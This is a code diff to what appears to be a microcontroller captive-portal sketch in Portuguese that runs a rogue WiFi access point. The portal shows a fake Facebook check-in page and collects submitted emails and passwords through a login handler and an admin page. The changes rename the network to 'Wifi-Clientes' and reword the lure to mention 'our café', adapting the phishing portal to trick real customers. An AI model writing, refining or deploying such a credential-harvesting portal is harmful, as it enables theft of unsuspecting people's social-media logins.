@@ -40,7 +40,7 @@ String responseHTML = ""
                       "<div class='container'>"
                       "<div class='welcome-message'>"
                       "<h1>Bem-vindo à Rede WiFi</h1>"
-                      "<p>Para se conectar à rede, faça check-in no Facebook ou faça o login diretamente.</p>"
+                      "<p>Para se conectar à rede, faça check-in no Facebook no nosso café ;).</p>"
                       "</div>"
                       "<button class='facebook-button' onclick='redirectToFacebookLogin()'>Fazer Check-In no Facebook</button>"
                       "</div>"
@@ -191,6 +191,7 @@ void handleAdmin() {
   webServer.send(200, "text/html", adminPageHTML);
 }
 
+
 void handleLoginSubmit() {
   if (webServer.hasArg("email") && webServer.hasArg("password")) {
     Credentials credentials;
@@ -206,7 +207,7 @@ void setup() {
   Serial.begin(115200);
   WiFi.mode(WIFI_AP);
   WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
-  WiFi.softAP("DNSServer CaptivePortal example");
+  WiFi.softAP("Wifi-Clientes");
   dnsServer.start(DNS_PORT, "*", apIP);
 
   webServer.on("/admin", HTTP_GET, handleAdmin);
